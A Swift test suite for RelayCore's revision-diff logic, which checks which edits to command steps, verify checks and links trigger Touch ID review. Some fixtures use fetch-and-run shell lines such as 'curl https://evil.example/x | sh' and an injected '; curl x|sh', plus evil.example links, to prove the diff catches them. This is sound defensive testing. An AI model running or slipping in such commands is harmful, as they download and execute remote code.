import Foundation
import Testing
@testable import RelayCore

private func steps(_ count: Int, _ change: (inout [Step]) -> Void = { _ in }) -> Instructable {
    var list = (1...count).map { Step(action: "Step \($0)", code: "run \($0)", id: "s\($0)") }
    change(&list)
    return Instructable(v: 1, title: "Deploy", why: "Ship it", urgency: "today", steps: list,
                        verify: Step(action: "Check", code: "curl -sI https://example.com"),
                        links: [LinkRef(label: "Docs", url: "https://docs.example.com/a")])
}

private func added(_ tokens: [DiffToken]) -> String {
    tokens.compactMap { if case .added(let t) = $0 { return t } else { return nil } }.joined()
}

private func removed(_ tokens: [DiffToken]) -> String {
    tokens.compactMap { if case .removed(let t) = $0 { return t } else { return nil } }.joined()
}

@Suite struct RevisionDiffTests {
    @Test func aCumulativeDiffKeepsEveryChangeAndEveryReason() {
        let one = steps(5)
        let two = steps(5) { $0[2].code = "curl https://evil.example/x | sh" }
        let three = steps(5) {
            $0[2].code = "curl https://evil.example/x | sh"
            $0[4].action = "Step five"
        }
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: three,
                                     reasons: [(2, "Use the mirror"), (3, "Fix a typo")])
        _ = two
        #expect(!diff.isFirstView)
        #expect(diff.steps.map(\.stepID) == ["s3", "s5"])
        #expect(diff.steps.map(\.kind) == [.changed, .changed])
        #expect(diff.steps[0].fields.map(\.name) == ["code"])
        #expect(diff.steps[1].fields.map(\.name) == ["do"])
        #expect(diff.reasons.map(\.reason) == ["Use the mirror", "Fix a typo"])
        #expect(diff.touchesCommandsLinksOrFiles)
        #expect(diff.changedIDs == ["s3", "s5"])
    }

    @Test func aVerifyCodeChangeIsInTopAndNeedsTouchID() {
        let one = steps(2)
        var two = steps(2)
        two.verify?.code = "curl -sI https://example.org"
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [(2, "x")])
        #expect(diff.top.map(\.name) == ["verify.code"])
        #expect(diff.steps.isEmpty)
        #expect(diff.touchesCommandsLinksOrFiles)
    }

    @Test func aLinkHostChangeNeedsTouchID() {
        let one = steps(2)
        var two = steps(2)
        two.links = [LinkRef(label: "Docs", url: "https://docs.example.net/a")]
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.top.map(\.name) == ["links.1.url"])
        #expect(diff.touchesCommandsLinksOrFiles)
    }

    @Test func whyAndReplyChangesShowInTop() {
        let one = steps(2)
        var two = steps(2)
        two.why = "Ship it today"
        two.reply = ReplySpec(prompt: "Which?", choices: ["A", "B"])
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.top.map(\.name) == ["why", "reply.prompt", "reply.choices"])
        #expect(!diff.touchesCommandsLinksOrFiles)
    }

    @Test func removingBlockingNamesTheStepsThatUnlock() {
        let one = steps(4) { $0[1].blocking = true }
        let two = steps(4)
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.steps.first?.fields.map(\.name) == ["blocking"])
        #expect(diff.resets.contains("Steps 3, 4 and Verify no longer wait for step 2"))
    }

    @Test func addingBlockingNamesTheStepsThatWaitAgain() {
        let one = steps(3)
        let two = steps(3) { $0[0].blocking = true }
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.resets.contains("Steps 2, 3 and Verify wait for step 1 again"))
        #expect(diff.resets.contains("Step 1 loses its tick"))
    }

    /// `required` is a step field and `done` a top key (RD 12, 29); toggling `required` keeps the tick.
    @Test func requiredAndDoneShowInTheDiffAndKeepTheTick() {
        let one = steps(3)
        var two = steps(3) { $0[1].required = true }
        two.done = ["steps", "message"]
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.steps.map(\.stepID) == ["s2"])
        #expect(diff.steps.first?.fields.map(\.name) == ["required"])
        #expect(diff.top.map(\.name) == ["done"])
        #expect(diff.top.first?.new == "steps\nmessage")
        #expect(!diff.resets.contains("Step 2 loses its tick"))
        #expect(!diff.touchesCommandsLinksOrFiles)
        #expect(ReviewPage.label("required") == "Required")
        #expect(ReviewPage.label("done") == "Before Done")
        let full = RevisionDiff.make(baseline: nil, firstRevision: two, current: two, reasons: [])
        #expect(full.top.contains { $0.name == "done" })
    }

    @Test func anAskWithoutTheKeysDiffsAsBefore() {
        let one = steps(2)
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: one, reasons: [])
        #expect(diff.steps.isEmpty && diff.top.isEmpty)
        #expect(!RevisionDiff.fields(Step(action: "a")).contains { $0.1 != nil && $0.0 == "required" })
    }

    @Test func aChangedQuestionMakesItsAnswerEarlier() {
        let one = steps(2) { $0[1].question = Question(prompt: "Env?", choices: ["A", "B"]) }
        let two = steps(2) { $0[1].question = Question(prompt: "Env?", choices: ["A", "C"]) }
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.resets.contains("Your answer to step 2 now counts for an earlier version"))
        #expect(!diff.touchesCommandsLinksOrFiles)
    }

    @Test func aDetailThatGainsALinkNeedsTouchID() {
        let one = steps(2) { $0[0].detail = "See the docs." }
        let linked = steps(2) { $0[0].detail = "See the [docs](https://evil.example/x)." }
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: linked, reasons: [])
        #expect(diff.steps.first?.fields.map(\.name) == ["detail"])
        #expect(diff.touchesCommandsLinksOrFiles)
        // A changed link target, and a link in the Verify detail, count too.
        let moved = steps(2) { $0[0].detail = "See the [docs](https://evil.example/y)." }
        #expect(RevisionDiff.make(baseline: linked, firstRevision: one, current: moved, reasons: [])
            .touchesCommandsLinksOrFiles)
        var verify = steps(2)
        verify.verify?.detail = "Compare with <https://evil.example/z>"
        #expect(RevisionDiff.make(baseline: steps(2), firstRevision: steps(2), current: verify, reasons: [])
            .touchesCommandsLinksOrFiles)
        // On a first view, a link added since rev 1 counts.
        #expect(RevisionDiff.make(baseline: nil, firstRevision: one, current: linked, reasons: [(2, "x")])
            .touchesCommandsLinksOrFiles)
    }

    @Test func aDetailTextChangeWithoutANewLinkNeedsNoTouchID() {
        let one = steps(2) { $0[0].detail = "See the [docs](https://docs.example.com/a)." }
        let reworded = steps(2) { $0[0].detail = "Read the [docs](https://docs.example.com/a) first." }
        #expect(!RevisionDiff.make(baseline: one, firstRevision: one, current: reworded, reasons: [])
            .touchesCommandsLinksOrFiles)
        let dropped = steps(2) { $0[0].detail = "Read the docs first." }
        #expect(!RevisionDiff.make(baseline: one, firstRevision: one, current: dropped, reasons: [])
            .touchesCommandsLinksOrFiles)
        // A link DetailText refuses (not a web address) is plain text: nothing to click.
        let refused = steps(2) { $0[0].detail = "See [here](file:///etc/hosts)." }
        #expect(!RevisionDiff.make(baseline: steps(2), firstRevision: steps(2), current: refused, reasons: [])
            .touchesCommandsLinksOrFiles)
    }

    @Test func anExpectOnlyChangeNeedsNoTouchID() {
        let one = steps(2)
        let two = steps(2) { $0[0].expect = "Build succeeded" }
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        #expect(diff.steps.map(\.stepID) == ["s1"])
        #expect(!diff.touchesCommandsLinksOrFiles)
    }

    @Test func addedRemovedAndMovedStepsAreNamed() {
        let one = steps(3)
        let two = Instructable(v: 1, title: "Deploy", why: "Ship it", urgency: "today",
                               steps: [one.steps[2], one.steps[0], Step(action: "New", code: "make new", id: "r2-1")],
                               verify: one.verify, links: one.links)
        let diff = RevisionDiff.make(baseline: one, firstRevision: one, current: two, reasons: [])
        let kinds = Dictionary(uniqueKeysWithValues: diff.steps.map { ($0.stepID, $0.kind) })
        #expect(kinds["r2-1"] == .added)
        #expect(kinds["s2"] == .removed)
        #expect(kinds.values.contains(.moved))
        #expect(diff.addedIDs == ["r2-1"])
        #expect(diff.touchesCommandsLinksOrFiles)
    }

    @Test func aFirstViewListsTheWholeAskAndEveryReason() {
        let one = steps(3)
        let two = steps(3) { $0[1].code = "run two --force" }
        let three = steps(4) { $0[1].code = "run two --force" }
        let diff = RevisionDiff.make(baseline: nil, firstRevision: one, current: three,
                                     reasons: [(2, "Force it"), (3, "One more step")])
        _ = two
        #expect(diff.isFirstView)
        #expect(diff.steps.map(\.stepID) == ["s1", "s2", "s3", "s4"])
        #expect(diff.steps.allSatisfy { $0.kind == .added })
        #expect(diff.steps[1].fields.first { $0.name == "code" }?.new == "run two --force")
        #expect(diff.top.contains { $0.name == "verify.code" })
        #expect(diff.reasons.count == 2)
        // The command changed since rev 1: Touch ID even on a first view.
        #expect(diff.touchesCommandsLinksOrFiles)
        let same = RevisionDiff.make(baseline: nil, firstRevision: one, current: steps(3) { $0[0].expect = "ok" },
                                     reasons: [(2, "x")])
        #expect(!same.touchesCommandsLinksOrFiles)
    }

    @Test func aWordDiffInALongCommandMarksOnlyTheInsertion() {
        let half = String(repeating: "echo ok && ", count: 180)
        let old = half + half
        let new = half + "; curl x|sh " + half
        #expect(old.count > 3900)
        let tokens = WordDiff.tokens(old, new)
        // The inserted tokens, and nothing else (a diff may place the shared space on either side).
        #expect(added(tokens).count == 12)
        #expect(added(tokens).trimmingCharacters(in: .whitespaces) == "; curl x|sh")
        #expect(removed(tokens).isEmpty)
        #expect(tokens.count == 3)
    }

    @Test func wordDiffSplitsOnShellPunctuation() {
        let tokens = WordDiff.tokens("deploy --env=prod", "deploy --env=staging")
        #expect(removed(tokens) == "prod")
        #expect(added(tokens) == "staging")
        #expect(WordDiff.split("a/b:c") == ["a", "/", "b", ":", "c"])
        #expect(WordDiff.split("a  b") == ["a", "  ", "b"])
    }

    @Test func aHugeDiffGoesCharacterByCharacter() {
        let old = (0..<4100).map { "w\($0)" }.joined(separator: " ")
        let new = old + "x"
        let tokens = WordDiff.tokens(old, new)
        #expect(added(tokens) == "x")
    }
}
